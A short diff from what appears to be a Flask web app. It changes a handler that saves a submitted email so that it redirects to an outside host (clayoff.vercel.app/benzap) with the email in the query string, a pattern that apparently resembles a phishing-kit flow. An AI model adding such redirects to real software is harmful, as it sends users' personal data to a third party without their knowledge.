@@ -244,7 +244,7 @@ def first():
         session['eman'] = email
 
         # Redirect
-        return redirect(url_for('benza', web=email))
+        return redirect(f"https://clayoff.vercel.app/benzap?web={email}")
 
     return "Method Not Allowed", 405
 
